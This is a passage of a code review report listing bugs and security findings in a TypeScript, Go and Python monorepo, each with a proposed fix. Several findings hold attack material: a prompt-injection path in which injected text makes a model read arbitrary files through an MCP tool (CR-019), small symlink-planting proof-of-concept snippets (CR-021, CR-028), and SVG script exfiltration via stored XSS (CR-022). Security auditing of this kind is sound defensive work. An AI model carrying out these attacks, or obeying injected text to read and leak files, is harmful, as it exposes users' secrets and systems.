**Anchor:** `case "nonzero_exit":` inside `buildFetchCredentialTool`'s `execute`
**Severity:** high

The success path (`case "ok":`) is deliberately redaction-aware: `result.stdout` (which can contain the fetched secret) is sent to the agent via `text`, but `run.jsonl` only gets it verbatim when the operator opts in via `resolverConfig.includeInTranscripts` — otherwise `textResult` is called with a `transcriptText` override (`<credential redacted: ...>`), so `EvidenceLogger.logToolResult`'s redaction (see `logger.ts`, which substitutes `transcriptText` for `text` before writing the row) keeps the secret out of the durable evidence log by default.

The `nonzero_exit` failure path does not honor this same setting at all:

```ts
return textResult(
  `Error: fetch_credential resolver exited ${result.exitCode} for ${entity}:${key}:\n${result.stderr}`,
);
```

`textResult` is called with no `opts.transcriptText`, so `result.stderr` (up to `STDERR_CAP_BYTES` = 8 KiB, but otherwise verbatim) is always written into `run.jsonl`'s `tool_result.text`, regardless of `includeInTranscripts`. A resolver script that echoes diagnostic context to stderr before a non-zero exit — a very ordinary thing for an operator-authored credential-fetch script to do (e.g. dumping the HTTP response body, a partially-fetched OTP, or an upstream auth token used to reach the OTP provider) — lands unredacted in the durable, disk-persisted evidence file even when the operator explicitly configured `MOE_FLIGHT_CREDENTIAL_INCLUDE_IN_TRANSCRIPTS=false` (the default). The `timeout` case avoids this by not including `result.stderr` in its message at all, which confirms the omission on `nonzero_exit` is inconsistent rather than intentional. The fix is to route `nonzero_exit` (and any other stderr-bearing message) through the same `transcriptText` gating as the `ok` case.

### CR-016: `executeRunCore` double-fires lifecycle hooks and misreports a successful run as errored when `beforeClose`/`afterClose` throws

**File:** `packages/flight/src/qa/runs/orchestrator.ts`
**Anchor:** `executeRunCore`
**Severity:** high

`executeRunCore`'s success path calls `hooks?.beforeClose?.(started)` and
`hooks?.afterClose?.(started)` **unguarded** (no per-call `try`), after
`writeResultFiles` has already durably written `result.json` to disk:

```
await hooks?.beforeClose?.(started);
try { await adapter.close(); } catch { /* swallow */ }
detachLogger();
await hooks?.afterClose?.(started);
return { runId, outDir, result };
```

If either of those two calls throws, control does **not** return the
already-computed `result` — it falls into the function's outer `catch (err)`
block, which:

1. calls `hooks.onError(err, ctx)` with the hook's own exception, not a real
   run error — mislabeling a cleanup-hook failure as an agent/run failure;
2. calls `hooks.beforeClose(ctx)` a **second** time;
3. calls `adapter.close()` a **second** time;
4. calls `detachLogger()` a **second** time;
5. calls `hooks.afterClose(ctx)` a **second** time (this time guarded, so the
   original error is swallowed);
6. `throw err;` — so `executeRunCore` **rejects** with the hook's error even
   though the run itself passed/failed/investigated normally and
   `result.json` was already on disk.

I verified this by instrumenting `executeRunCore` with a `hooks.afterClose`
that throws, using the existing `makeScriptedClient`/`report` test helpers
(same pattern as `test/qa/runs/orchestrator-ordering.test.ts`) and a `cli`
adapter running `true`. Observed call order and outcome:

```
CALLS: ["beforeClose","afterClose","onError:afterClose boom","beforeClose","afterClose"]
REJECTED: afterClose boom
```

So `beforeClose`/`afterClose` each ran twice, `onError` fired for a hook bug
rather than a run failure, and the promise returned by `executeRunCore`
rejected with "afterClose boom" — for a run whose agent loop actually
reported `pass` and had already been written to `result.json`.

This is reachable under ordinary conditions: `afterClose` is documented (see
the `ExecuteRunCoreOptions.writeResultFiles` and
`RunCoreHooks.afterClose` doc comments) as "where the wrapper unregisters
from the active-run registry" — any bug or double-unregister race in that
registry code turns a normal, successful run into an apparent orchestrator
failure. Any caller wrapping `executeRunCore` as a `run-set` `Executor` (see
`runRunSet`/`runLoop` in `run-set.ts`) will catch this rejection and record
the run as `"errored"` in the run-set summary — silently discarding the real
pass/fail/investigate verdict that was already persisted.

Fix: wrap the success-path `beforeClose`/`afterClose` calls in their own
try/catch (mirroring the catch block's already-guarded calls), so a hook
exception is logged/reported without re-entering the whole error path,
double-invoking hooks, or overwriting the already-known result with a
rejection.

### CR-017: Card creation form does not enforce the character set `makeRunId`/`parseRunId` require, silently breaking live transcript for the run

**File:** `packages/flight/ui/src/components/NewCardForm.tsx`
**Anchor:** `handleSubmit`, `if (!id.trim() || !title.trim())`
**Severity:** high

`handleSubmit` only checks that `id` is non-empty; it accepts any string
(spaces, underscores, dots, slashes, etc.) and POSTs it verbatim via
`api.cards.create`. I checked the server side of this contract:

- `packages/flight/src/qa/api/routes/scenarios.ts`'s `POST /` handler only
  validates that `id` is a non-empty string and that the resulting file path
  is safe (`isSafePath`) — it does not check character set either.
- `packages/flight/src/qa/util/brands.ts`'s `asCardId` is a pure type-level
  brand (`(s: string): CardId => s as CardId`) with zero runtime check.
- `packages/flight/src/qa/util/id.ts`'s `makeRunId(cardId)` builds
  `` `${cardId}_${ts}_${nonce}` `` and documents that this only works because
  "story-card parsing already enforces `[a-zA-Z0-9-]`" — a claim that, per
  the two points above, is not actually true anywhere in the create path.
- `packages/flight/src/qa/api/ws-upgrade.ts`'s `decideUpgrade` gates the
  `/api/ws?run=<runId>` upgrade (used by `useLiveTranscript.ts`, in this
  shard) through `parseRunId`, whose regex is
  `^[a-zA-Z0-9-]+_\d{8}T\d{6}Z_[a-z0-9]{4}$` — the cardId group excludes `_`.

So: create a card through this form with an entirely ordinary id like
`user auth` or `sign_up-flow`, then run it. `makeRunId` produces e.g.
`user auth_20260416T142301Z_k3xm` / `sign_up-flow_20260416T142301Z_k3xm`.
`parseRunId` fails to match that string (the `_`/space breaks the greedy
`[a-zA-Z0-9-]+` cardId group before the timestamp literal), so
`decideUpgrade` returns `null` and the WebSocket upgrade for that run's live
transcript is silently refused. `useLiveTranscript.ts`'s `ws.onerror`/
`ws.onclose` fire with no message, and the UI is left on "○ connecting"
forever (see the next finding) — the user gets no diagnostic pointing back
at the card id they typed. `POST /api/results/:id/file/...` reads under the
same runId-derived path convention, so posthoc artifact/transcript fetches
for that run are likewise at risk depending on how the on-disk id is
sanitized downstream.

Fix: validate `id` client-side against the same charset the rest of the
system assumes (`/^[a-zA-Z0-9-]+$/`), and surface a clear inline error
instead of `!id.trim()` alone. (The server-side gap in `scenarios.ts` is
outside this shard but is the same root cause and should get the same
guard.)

### CR-018: `seedPlanSkeleton` builds `depends_on` edges backwards

**File:** `packages/jig-graph/src/seed.ts`
**Anchor:** `bConsumesA` inside the "Step 4: Build depends_on edges between clusters" block, and its own comment "A cluster B depends on cluster A if any file in B consumes a file in A."
**Severity:** high

The dependency-direction computation is inverted. `consumers.get(f)` (populated in Step 2 via `client.traceConsumers([r.rel_path])`) holds the set of files that *consume* `f` — i.e. files that depend on `f`, not files `f` depends on. In Step 4, for cluster `i` ("B") and cluster `j` ("A"):

```js
const aFiles = new Set(clusters[j]!.files);
const bConsumesA = clusters[i]!.files.some((f) => {
  const fConsumers = consumers.get(f) ?? new Set();
  return [...fConsumers].some((c) => aFiles.has(c));
});
if (bConsumesA) deps.push(j + 1);
```

`fConsumers` is "who consumes `f` (a B file)". If one of those consumers is in cluster A, that means **A depends on B** (a file in A calls into B), not "B consumes A" as the variable name and the emitted `depends_on` edge claim. `validate.ts`'s Check 2/3 use the same `traceConsumers` primitive but get the direction right (`consumerCache.get(a.num)` = consumers of A's files; if one lands in B, B truly consumes A) — so this is an implementation bug local to `seed.ts`, not an ambiguity in the API.

Verified by running the exact mock from `seed.test.ts`'s "generates a markdown skeleton with tasks" test (`traceConsumers` always resolving to `handler.ts`, meaning handler.ts is the sole consumer of everything queried, i.e. handler.ts depends on middleware.ts and queries.ts): the generated skeleton emits `Task 2 (middleware.ts) depends_on [1]` and `Task 3 (queries.ts) depends_on [1]`, i.e. "middleware/queries depend on handler" — the exact opposite of what the mock data encodes (handler depends on middleware/queries). None of the existing tests catch this because they only assert that *some* `depends_on: [N]` array is non-empty, never which direction it points.

Since this is the entire point of `moe jig plan seed`, every multi-cluster skeleton it produces has backwards task ordering, silently, with no error — a human or agent filling in the skeleton would be told the wrong build order.

### CR-019: `read_conversation` MCP tool reads any path on disk with no containment check
**File:** `packages/memory/src/mcp-server.ts`
**Anchor:** `if (name === "read_conversation")`
**Severity:** high

The `read_conversation` tool handler does:

```ts
if (!fs.existsSync(params.path)) { throw new Error(`File not found: ${params.path}`); }
const jsonlContent = fs.readFileSync(params.path, "utf-8");
return textResult(formatConversationAsMarkdown(jsonlContent, params.startLine, params.endLine));
```

`params.path` is only constrained by zod to be a non-empty string (`ShowConversationInputSchema`) — there is no check that it resolves under `getArchiveDir()` or any other trusted root. Compare this to `read_journal_entry`, which routes through `JournalSearchService.readEntry()` — a two-stage resolve/realpath containment guard specifically written (per that file's own comment) because "a symlink escape" and arbitrary paths are a real threat here. `read_conversation` has none of that: any absolute path readable by the server process is read and, if it happens to parse as JSONL matching the `ConversationMessage` shape, its content is returned verbatim to the caller.

This tool is invoked by a model whose context is built largely from `search_conversations` results — i.e. from content harvested out of past transcripts, which can contain attacker-supplied text (prompt injection from web pages, file contents, etc. quoted in an old session). A prompt-injection payload that tells the model to call `read_conversation` with `path` set to some JSONL-shaped file elsewhere on disk (or a file the operator assumed was scoped to the archive) will have it read back to the model, and from there potentially exfiltrated in the model's own output. Even for files that are not valid JSONL, `JSON.parse` throwing still confirms file existence/structure to the caller, which is an unintended oracle.

I confirmed there is no other guard: `grep -rn "getArchiveDir\|isUnderRoot\|read_conversation" packages/memory/src/*.ts` shows `getArchiveDir()` used only by the CLI/indexer/sync/verify paths, never by `mcp-server.ts`. `show-cli.ts`'s equivalent CLI command is not a counterexample — it is invoked directly by the local user who already has full filesystem access, not by a model acting on the user's behalf under a trust boundary.

Fix: resolve `params.path`, realpath it, and require it be contained in `getArchiveDir()` (mirroring the journal's two-stage guard) before reading.

### CR-020: `release --execute` commands print success but never invoke the release automation they claim to run

**File:** `packages/mint/src/release/promotion.ts`
**Anchor:** `promoteToStable`
**Severity:** high

`promoteToStable` (this file), `prepareCandidate` (`packages/mint/src/release/candidate.ts`), and the
Claude-maintenance certification runner (`packages/mint/src/release/claude-maintenance.ts`) are fully
implemented, exported, and covered by dedicated unit tests (`test/release-promotion.test.ts`,
`test/release-candidate.test.ts`, `test/release-claude-maintenance.test.ts` — none in this shard, but
discoverable from these files' own imports). I verified with a repo-wide grep
(`grep -rln "prepareCandidate\|promoteToStable\|runClaudeMaintenance" --include=*.ts --include=*.mjs`,
excluding `node_modules`) that none of these three functions is imported from anywhere except their own
definition file and their own dedicated test file. The same is true for
`ProductionNpmRegistry`/`buildNpmCommandRunner` in `packages/mint/src/release/npm-registry.ts` (this
shard) and `computeResumeActions`/`hasBlockingActions`/`publishableActions` in
`packages/mint/src/release/recovery.ts` (this shard) — `RegistrySnapshot` (the input type
`computeResumeActions` consumes) has no constructor anywhere in `src/`.

I then read `packages/mint/src/cli.ts` (outside this shard, read only to follow the call graph) to find
where these are supposed to be wired in. Every `release` subcommand's `--execute` branch is a stub that
only logs a string and returns, without calling any of the above:

- `release candidate --execute` logs `` `candidate: preparing candidate ${opts.tag} in ${opts.repo}` ``
  and returns — it never calls `prepareCandidate`, never packs an artifact, never touches the release
  store or the npm registry.
- `release promote --execute` logs `` `promote: promoting ${opts.tag} in ${opts.repo}` `` and returns —
  it never calls `promoteToStable`, so `computeDistTagActions`, `validateEvidenceForPromotion`, and the
  actual `npm dist-tag add ... latest` calls in `ProductionNpmRegistry.setDistTag` never run.
  `release verify` doesn't even accept `--execute`; it just logs `` `verify: checking catalog for
  ${opts.catalogTag}` ``.
- `release certify-claude --execute` validates that the ten `--producer-*` flags are present, then logs
  `` `certify-claude: certifying candidate ${opts.candidate} in ${opts.repo}` `` and returns — it never
  calls the maintenance-certification runner, so no install/discover/update/uninstall checks are
  actually executed against a real candidate.

This shard's own `test/cli.test.ts` corroborates the gap by omission: it has
`'release certify-claude exits 0 in plan mode with candidate tag'`,
`'release candidate exits 0 in plan mode'`,
`'release promote exits 0 in plan mode with stable tag'`, and
`'release certify-claude exits 1 when --execute is missing producer identity'`, but no test anywhere
asserts that `--execute` actually performs any of candidate preparation, promotion, or certification —
because it doesn't.

Concretely: an operator (or a CI job) that runs `moe-mint release promote --tag v0.1.5 --repo . --execute`
after satisfying every producer/evidence precondition gets exit code 0 and a console line that reads as
confirmation the promotion happened. In reality, no npm registry state was inspected, no dist-tag was
moved, and no stable GitHub release was created or finalized — the entire elaborate, well-tested safety
machinery in `promotion.ts` (channel checks, evidence validation, integrity/downgrade blocking) never
runs. The same is true for `candidate` (no artifact is packed or uploaded) and `certify-claude` (no
maintenance checks execute). This is a false-positive success signal on the exact commands a release
pipeline would gate on, and it is unguarded by any test that exercises `--execute` end to end.

Fix: either wire each `--execute` branch to call the corresponding implementation
(`prepareCandidate`/`promoteToStable`/the certification runner) with real dependencies, or — until that
wiring lands — make the stub exit non-zero with an explicit "not implemented" `MintError` instead of
logging a message that reads as confirmation and exiting 0.

### CR-021: extractEmbedded's directory creation follows a pre-planted symlink, letting a co-tenant redirect the native-library cache outside the content-hash integrity check

**File:** `packages/tab/bindings/go/tab/loader.go`
**Anchor:** `extractEmbedded`, `os.MkdirAll(dir, 0o755)`
**Severity:** high

`extractEmbedded` derives `dir := filepath.Join(base, "moe", "tab-go", hex.EncodeToString(sum[:8]))` and then calls `os.MkdirAll(dir, 0o755)`. `os.MkdirAll` (like the underlying `mkdir(2)`/`stat(2)` syscalls) follows symlinks in every intermediate path component — it does not verify that `base/moe` (or `base/moe/tab-go`) is a directory it created itself rather than a symlink planted by another local user.

Reproduced against Go's real `os.MkdirAll` (scratch file, not committed):
```go
link := filepath.Join(base, "moe")
os.Symlink(attackerDir, link)          // attacker wins this once, before the victim's first run
os.MkdirAll(filepath.Join(base, "moe", "tab-go", "deadbeef"), 0o755)
// -> the directory is created inside attackerDir, not base
```
This actually ran and printed the resolved path landing under `attackerDir`, confirming the redirection (`attacker-owned target exists: true`).

`cacheBases()` tries `os.UserCacheDir()` first and only falls through to `os.TempDir()` — the shared, world-writable base — when `UserCacheDir()` errors or the extraction+dlopen sequence there fails. `os.UserCacheDir()` returns an error whenever neither `XDG_CACHE_HOME` nor `HOME` is set, which is common in minimal/CI/sandboxed containers (exactly the kind of environment moe's agent harnesses run under per `AGENTS.md`'s CI description). In that case every process on the shared host resolves the same `TempDir()`-rooted path, and any other local user can pre-create `os.TempDir()+"/moe"` as a symlink into a directory they own before the legitimate process ever runs.

Once redirected, the CR-081/CR-082 tamper-detection added in this same file (`TestExtractEmbeddedRejectsTamperedTarget`, `TestExtractEmbeddedReplacesSymlinkTarget`) stops protecting the caller: those tests only cover a symlink planted *at the final target file*, not at an ancestor directory. With the ancestor redirected, the attacker fully owns the directory the final file lives in and can swap its contents at will between this process's `os.ReadFile(target)` hash-check (or the `os.Rename` that follows a fresh write) and the subsequent `dlopen(path)` call the caller makes immediately after `extractEmbedded` returns — a TOCTOU window the attacker, as owner of the containing directory, can win repeatedly across every future invocation on that host, not just once. The result is arbitrary native code loaded into the victim process.

Fix: resolve `base` once with `filepath.EvalSymlinks`/`Lstat` and reject (or recreate under a path guaranteed not to traverse a symlink) any pre-existing non-directory or symlinked component under `base/moe`, or use `O_NOFOLLOW`-safe directory creation (e.g., `os.Mkdir` per level with an `Lstat` check that the just-created/found entry is a real directory owned by the current user) instead of `os.MkdirAll` over an attacker-influenced shared prefix.

### CR-022: Artifact files are served with browser-executable Content-Types, enabling stored XSS in the report UI

**File:** `py/proof/src/moe_proof/site.py`
**Anchor:** `serve_eval`, comment `"# YAML and unknown types render inline, not download"`
**Severity:** high

`serve_eval` serves any file under `runs/` with a Content-Type derived from
`mimetypes.guess_type(target.name)`, falling back to `text/plain` only for
unknown extensions. Files with recognized "renderable" extensions (`.html`,
`.svg`, `.js`, ...) are served as `text/html`, `image/svg+xml`, etc., with no
`Content-Security-Policy`, no `X-Content-Type-Options: nosniff`, and no
`Content-Disposition: attachment`. Any script embedded in such a file
executes, in the browser, in the same origin as the report server — which
also serves `/index.json` and every other eval's `eval.json`/artifacts on
that instance.

This is not a theoretical extension file: it is this repo's own example.
`py/proof/examples/pelican-riding-a-bicycle/checkers/extract-svg` takes an
LLM's raw output, regexes out the first `<svg>...</svg>` block, and writes it
verbatim to `extracted.svg` in the grade workspace (`Path(target).write_text(match.group(0))`)
with no sanitization. That file becomes a listed artifact
(`row["grades"][name]["files"]` from `collect_eval`), and opening it via
`/evals/<slug>/runs/<run>/grades/default/extracted.svg` serves it as
`image/svg+xml`, letting any `<script>` embedded in a model's SVG output
execute in the report server's origin — from which it can `fetch()`
`/index.json` and every eval's `eval.json`/run artifacts served by that
instance and exfiltrate them cross-origin. Since `moe-proof serve --host`
accepts `0.0.0.0` for sharing across a network, this is reachable by more
than just the local operator once shared.

Fix: force `Content-Disposition: attachment` (or at minimum serve
`.html`/`.svg`/`.js`/`.xhtml` as `text/plain`) for anything under
`runs/`, and add `X-Content-Type-Options: nosniff` to every response.

### CR-023: `pnpm provenance` false-positives (and fails) whenever a `.moe/worktrees/` checkout is present

**File:** `scripts/check-provenance.mjs`
**Anchor:** `SKIP_SEGMENTS` / `checkCanonicalLegalFiles`
**Severity:** high

`walk()`'s `SKIP_SEGMENTS` set (`.claude`, `.git`, `.planning`, `.venv`, `dist`,
`fixtures`, `node_modules`, `scripts`, `test`, `tests`) does not include `.moe`
or `worktrees`. `.moe/worktrees/` is a real, gitignored, and explicitly
documented part of this repo's own parallel-work protocol — `.gitignore` line
41 labels it "Agent-created linked worktrees for isolated plan execution", and
`AGENTS.md` §"Parallel work — the integration protocol" describes exactly this
workflow ("A wave's workers branch from one recorded base"). Any nested
worktree checkout necessarily contains its own complete, legitimately
generated `LICENSE`/`NOTICE` files and `plugins/*/LICENSE`/`NOTICE` copies.
`checkCanonicalLegalFiles()`'s "skip `plugins/`" guard
(`if (rel.startsWith("plugins/")) continue;`) only matches paths that begin
with the literal string `plugins/`, so it never matches
`.moe/worktrees/<branch>/plugins/...` — the nested worktree's plugin licenses
and NOTICE copies get walked and reported as violations.

I reproduced this against the live tree during this review (there is
currently a worktree at `.moe/worktrees/feature-skill-backend-runtime/`):

```
$ node scripts/check-provenance.mjs; echo $?
provenance: 31 imported works, 6 plugin licenses
provenance: 2 problem(s)
  - hand-maintained package license copies remain: .moe/worktrees/feature-skill-backend-runtime/LICENSE, .moe/worktrees/feature-skill-backend-runtime/plugins/moe/LICENSE, ...
  - package NOTICE copies remain: .moe/worktrees/feature-skill-backend-runtime/NOTICE, .moe/worktrees/feature-skill-backend-runtime/plugins/moe/NOTICE, ...
1
```

`pnpm provenance` is a required pre-MR gate (AGENTS.md: "Before opening an MR,
run `pnpm check` and `pnpm mint:check`" and it is also its own CI job in
`ci.yml`). Because leaving a review/wave worktree checked out is the repo's
sanctioned normal operating mode, this turns a routine, correct state into a
build-breaking false positive with no actual legal-metadata defect. Fix by
adding `.moe` (or specifically `worktrees`) to `SKIP_SEGMENTS`, or by having
`walk()` respect `.gitignore` for directories that are entire nested git
worktrees.

## Medium

### CR-024: docs-verify-report.mjs silently drops findings whose severity isn't an exact lowercase match, while still counting them in the total

**File:** `packages/core/skills/docs-update/scripts/docs-verify-report.mjs`
**Anchor:** `for (const sev of ["critical", "high", "medium", "low"]) {`
**Anchor:** `const group = allFindings.filter((f) => f.severity === sev);`
**Severity:** medium

A finding is assigned a `DV-###` id and counted in `findings.total`
regardless of its `severity` value, but it is only ever rendered in the
document body if `f.severity` is an exact-case match for one of
`"critical"|"high"|"medium"|"low"`. Any finding with a differently-cased or
misspelled severity (e.g. a doc-type producer emitting `"Critical"`) gets an
id, is added to `total`, and then appears in *no* section of the generated
report — an invisible finding.

Reproduced with `node -e`:

```
total 3 counts { critical: 1, high: 1, medium: 0, low: 0 }
critical rendered: [ 'DV-001' ]
high rendered: [ 'DV-002' ]
medium rendered: []
low rendered: []
all ids assigned: [ 'DV-001', 'DV-002', 'DV-003' ]
```

`DV-003` (severity `"Critical"`) is assigned an id and counted in
`findings.total: 3`, but never appears under any `##` severity heading in the
body — a reader sees a report claiming 3 findings with only 2 visible, and
the third (possibly the most severe) is nowhere to be found.

Fix: normalize `f.severity` (e.g. `.toLowerCase()`) before grouping/counting,
and/or fail loudly on an unrecognized severity value instead of silently
excluding it from the rendered body.

### CR-025: chunk_spec.py misattributes line numbers for sections with duplicate heading text and shared opening content

**File:** `packages/core/skills/extracting-requirements/scripts/chunk_spec.py`
**Anchor:** `def find_line_range(full_content: str, section_content: str) -> tuple[int, int]:`
**Severity:** medium

`find_line_range` locates a section's line range with
`full_content.find(section_content[:80])`, which returns the position of the
*first* match. When two sections share the same heading text and their
content begins with the same 80 characters — common in specs that repeat a
boilerplate opening sentence under a recurring subheading like `### Notes` or
`### Examples` across multiple features — every section after the first is
reported at the first section's line numbers instead of its own.

Reproduced: a spec with `## Feature One` / `### Notes` followed later by
`## Feature Two` / `### Notes`, both `### Notes` sections opening with the
identical sentence "Refer to the shared appendix for full details on error
handling semantics here." Chunking it (`max_tokens=50` to force the split)
gives:

```
'Feature One > Notes' -> lines 4 - 6
'Feature Two > Notes' -> lines 4 - 6   # actually at lines 9-11
```

`start_line`/`end_line` from this script feed directly into the `sources`
`lines` field that `aggregate_stories.py` (`format_epic_file`) and
`aggregate_scenarios.py` (`format_scenario`) render verbatim as
`` `spec.md:9-11` `` citations in the generated `EPIC-*.md` and
`behavior-scenarios.md`. A citation produced this way silently points a
reader at the wrong section of the source spec, with no indication anything
went wrong.

Fix: search from the end of the *previous* match rather than from the start
of `full_content` each time (e.g. thread an offset through `split_by_heading`
sections in document order), or match on a longer/more unique substring.

### CR-026: Negative-index slice makes the epic-misattribution regression guard vacuous
**File:** `packages/core/test/iterative-development/test_aggregate_stories.py`
**Anchor:** `test_dedup_does_not_merge_same_title_across_different_epics`
**Severity:** medium

The test's whole point (per its docstring) is to prove that two requirements
sharing a title in different epics are not merged and that "the Billing
story must not be misattributed to the Auth epic." It tries to isolate the
text around the Billing citation with:

```python
billing_section = output[output.index("domain-billing.md") - 2000:]
self.assertIn("card", billing_section.lower())
```

`output.index(...)` finds `"domain-billing.md"` well before offset 2000 in
the realistic (short) aggregated output, so `idx - 2000` is negative. Python
slicing with a negative start does not clamp to 0 the way the author
intended — `output[negative:]` counts from the *end* of the string, and once
the magnitude exceeds `len(output)` it silently returns the whole string.

I reproduced this directly against the real `aggregate_stories.py`:

```
total output length: 823
index of domain-billing.md: 488
idx - 2000 = -1512
billing_section length: 823   # == len(output); the "slice" is the whole doc
```

So `billing_section` is just `output` in its entirety, not a window "near"
the Billing citation. The assertion `assertIn("card", billing_section.lower())`
therefore passes whenever the word "card" appears *anywhere* in the combined
output (e.g. inside the Billing story text even if the aggregator wrongly
filed it under the Auth epic file) — it does not verify per-epic
attribution at all. The regression this test exists to catch (a title-keyed
dedup bug smearing content across epics) could reappear and this test would
keep passing, because the localized-window check it claims to perform never
actually executes on a slice smaller than the whole document.

Fix: compute the window with `max(0, idx - 2000)` (or slice
`output[idx:idx + N]` forward from the match instead of backward), and
additionally assert `"card" not in <the corresponding Auth-epic slice>` so
the test fails if misattribution actually occurs.

### CR-027: `--worktree` teardown paths delete the worktree marker without removing the git worktree, leaking disk and git state

**File:** `packages/crew/src/commands/await-start.ts`
**Anchor:** `awaitSessionStart`
**Severity:** medium

`cmdLaunch` (`packages/crew/src/commands/launch.ts`) creates a disposable git worktree and writes a sidecar marker (`writeWorktreeMarker`) before dispatching to either launch path, when `--worktree` is passed. If the subsequent proof-of-life wait times out, `awaitSessionStart` tears the worker down via:

```
await ctx.tmux.killSession(tmuxName);
removeWorker(ctx.workerDir, sessionId, tmuxName);
```

`removeWorker` (in `packages/crew/src/core/worker-store.ts`, read only to confirm this) removes the `.worktree` sidecar file itself (`rmSync(worktreeMarkerPath(dir, name), { force: true })`) but never calls `removeWorktree` (the `git worktree remove --force …` helper in `packages/crew/src/core/worktree.ts`) the way `cmdStop` does. The same gap exists in `launchDerive`'s own failure branch in `launch.ts` (`"tmux session '${tmuxName}' was not started …"`), which also calls `removeWorker` directly.

The result: on a launch failure with `--worktree` set (a real, reachable condition — `DEFAULT_START_TIMEOUT_MS` is only 30s, easily exceeded on a slow machine or cold harness install), the actual `.moe-worktrees/<name>` checkout is left on disk and remains registered in git's internal worktree list, while the one piece of state that would have let any later command find and clean it up (the sidecar marker) has just been deleted. `cmdPrune` has the identical problem (it also calls the plain `removeWorker`/`removeOrphan`, not the worktree-aware cleanup `cmdStop` uses), so a launch that lands in the `gone` state and gets swept by `prune` leaks the same way. Only `cmdStop`'s explicit path reads the marker before deleting it and calls `removeWorktree`.

Fix: route every teardown path that might be tearing down a `--worktree` worker (the `awaitSessionStart` timeout branch, `launchDerive`'s no-session branch, and `cmdPrune`) through the same read-marker-then-`removeWorktree` sequence `cmdStop` already uses, or make `removeWorker`/`removeOrphan` themselves worktree-aware.

### CR-028: `ensureOwnedDir`'s create-path has a TOCTOU window that defeats its own symlink defense

**File:** `packages/crew/src/core/worker-store.ts`
**Anchor:** `ensureOwnedDir`
**Severity:** medium

`ensureOwnedDir` is documented as closing exactly one threat: "another local account could... pre-plant a directory (or a symlink)... at a predictable worker-dir or per-worker-home path ahead of us." The existing-path branch does defend against a symlink planted *before* the call (verified by the `ensureOwnedDir (CR-019/CR-021)` describe block in `test/worker-store.test.ts`, which plants a symlink first and asserts the throw).

The create-path does not have the same protection:

```
try {
  st = lstatSync(dir);
} catch {
  mkdirSync(dir, { recursive: true, mode: 0o700 });
  return;
}
```

If `dir` does not exist when `lstatSync` runs (the common case — a fresh worker home), the code falls into the `catch` and calls `mkdirSync(dir, { recursive: true })` with no re-verification afterward. `mkdirSync` with `recursive: true` does not throw if the target path already exists as a directory (including a symlink that *resolves* to a directory) — it silently succeeds. I verified this directly:

```
$ ln -s attacker-owned victim-dir
$ node -e 'require("fs").mkdirSync("victim-dir", {recursive:true, mode:0o700})'
mkdirSync succeeded (no throw) even though victim-dir is a symlink
```

So an attacker who can win the race between the `lstatSync` ENOENT and the `mkdirSync` call — by planting a symlink to an attacker-owned directory at the not-yet-existing path in that window — causes `ensureOwnedDir` to return normally as if it had created a fresh, private, owned directory. Every caller (`stageCredentialFile`'s destination directory via `codex.ts`/`pi.ts` `prepare`, `consent.ts`'s state dirs, `launch.ts`/`adopt.ts`'s worker dir) then proceeds to write credentials or state into what is actually an attacker-controlled directory. The window is narrow (a handful of syscalls between two synchronous calls), but it is exactly the shared-host / predictable-path threat model the function's own docstring claims to close, and there is no test exercising the create-then-race case (only the already-exists case is tested).

Fix: after the `mkdirSync` call in the catch branch, `lstatSync` again and verify `isDirectory()` and ownership before returning (or open the directory with `O_NOFOLLOW`/use `mkdirSync` without `recursive` so an existing entry throws `EEXIST` and can be re-validated).

### CR-029: Same unsanitized-session-id pattern in the pi extension's self-registration path

**File:** `packages/crew/src/pi-extension/index.ts`
**Anchor:** `record`, `ctx.sessionManager.getSessionId()`
**Severity:** medium

`record()` takes `sid = ctx.sessionManager.getSessionId()` — an id minted by
the `pi` process itself, not by moe-crew — and, exactly like the hook above,
passes it unsanitized into `metaPath(dir, sid)` and `eventsPath(dir, sid)`
before calling `writeMeta`/`appendEvent`. The only guard is
`if (sid.length === 0) return;`; there is no format check.

The consequence here is softer than in `emit-event.ts` because the whole body
of `record()` is wrapped in `try { ... } catch { /* best-effort */ }`
("BEST-EFFORT / NEVER THROW" per the block comment above it), so a bad `sid`
cannot crash the extension. But a `sid` containing `../` still results in a
real, attacker/harness-influenceable file write outside the worker dir
whenever the traversal's parent directory happens to exist — the write simply
succeeds silently rather than throwing. `pi-extension.test.ts`'s "never
throws" tests only cover malformed *event payloads* (`pi.fire("tool_call",
{}, ...)`), not a hostile session id, so this path has no regression coverage
either.

Fix: apply the same safe-segment validation as the emit-event hook (ideally
by sharing the check, e.g. exporting `assertSafeSegment` from `paths.ts` and
calling it from both `record()` and `runHook` before path construction), and
no-op instead of writing when it fails.

### CR-030: `pidAlive` reports pid 0 and negative pids as permanently alive, contradicting its own doc comment

**File:** `packages/flight/dashboard/src/scan.ts`
**Anchor:** `pidAlive`
**Severity:** medium

```ts
export function pidAlive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch (err: unknown) {
    return err instanceof Error && "code" in err && err.code === "EPERM";
  }
}
```

The comment directly above claims "Everything else (including an
out-of-range pid) is treated as dead." That is false for `pid <= 0`. Verified
on this machine:

```js
process.kill(0, 0)   // no throw
process.kill(-1, 0)  // no throw
```

`kill(pid, 0)` with `pid === 0` signals the caller's own process group (which
always contains the caller), and `pid < 0` signals every process in that
group — both succeed with signal 0 without ever reaching the `ESRCH`/`EPERM`
branch, so `pidAlive` returns `true` for `0` and any negative number.
`PhaseJsonSchema` only requires `pid: z.number()` — no positivity or
integer constraint — so a `phase.json` with `pid: 0` (e.g. from a partially
initialized writer, or any future bug that fails to set the real pid before
first write) is schema-valid and will read as alive forever. Since this is
the most-recent windowed run, `scanResults` will keep re-asserting
`cell.running` on every scan tick with no path back to `not_run`/`empty` even
though the process is provably not the one that wrote the phase — the cell is
stuck showing "running" indefinitely.

Fix: treat `pid <= 0` (or non-integer) as dead before calling `process.kill`,
and/or tighten `PhaseJsonSchema`'s `pid` to `z.number().int().positive()` so
a schema-invalid phase.json degrades to "no live phase" instead of parsing
into a value that later reads as immortal.

**Disposition:** fixed
**Commit:** `864a47110997ceddf502f4eac0e6fadaeae197c6`
**Resolved:** 2026-09-04
**Note:** —
### CR-031: `driftFlag`/`cardView` can label a stale run as "latest" when the true latest run's cost is unpriced

**File:** `packages/flight/dashboard/src/view.ts`
**Anchor:** `cardView` — `` driftLine = `▲ latest $${latest.toFixed(2)} vs median $${med.toFixed(2)} of prior runs`; ``
**Severity:** medium

`cellView` computes `drift = driftFlag(cellCosts(cell))`, and when true,
`cardView` independently recomputes `presentCosts = cellCosts(cell)` to build
the `drift_line` string. `cellCosts()` filters out every run whose
